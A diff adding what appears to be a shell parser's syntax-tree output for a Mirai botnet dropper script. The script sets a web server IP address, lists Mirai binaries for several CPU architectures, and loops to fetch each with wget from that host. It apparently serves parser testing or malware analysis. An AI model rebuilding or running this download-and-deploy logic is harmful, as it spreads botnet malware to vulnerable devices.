@@ -1,0 +1,30 @@
+CommandNode(lineno=4, pos=(20, 48), parts=[
+  AssignmentNode(lineno=4, pos=(20, 48), word='WEBSERVER=46.166.185.75:80'),
+])
+CommandNode(lineno=8, pos=(70, 163), parts=[
+  AssignmentNode(lineno=8, pos=(70, 163), word='BINARIES=mirai.arm mirai.m68k mirai.mips mirai.mpsl mirai.ppc mirai.sh4 mirai.x86 mirai.spc'),
+])
+CompoundNode(lineno=14, list=[
+  ForNode(lineno=14, pos=(165, 276), parts=[
+    ReservedwordNode(lineno=10, pos=(165, 168), word='for'),
+    WordNode(lineno=10, pos=(169, 175), word='Binary'),
+    ReservedwordNode(lineno=10, pos=(176, 178), word='in'),
+    WordNode(lineno=10, pos=(179, 188), word='$BINARIES', parts=[
+      ParameterNode(lineno=10, pos=(179, 188), value='BINARIES'),
+    ]),
+    ReservedwordNode(lineno=10, pos=(188, 189), word=';'),
+    ReservedwordNode(lineno=10, pos=(190, 192), word='do'),
+    CommandNode(lineno=11, pos=(194, 235), parts=[
+      WordNode(lineno=11, pos=(194, 198), word='wget'),
+      WordNode(lineno=11, pos=(199, 224), word='http://$WEBSERVER/$Binary', parts=[
+        ParameterNode(lineno=11, pos=(206, 216), value='WEBSERVER'),
+        ParameterNode(lineno=11, pos=(217, 224), value='Binary'),
+      ]),
+      WordNode(lineno=11, pos=(225, 227), word='-O'),
+      WordNode(lineno=11, pos=(228, 235), word='$Binary', parts=[
+        ParameterNode(lineno=11, pos=(228, 235), value='Binary'),
+      ]),
+    ]),
+    ReservedwordNode(lineno=14, pos=(272, 276), word='done'),
+  ]),
+], pos=(165, 276))
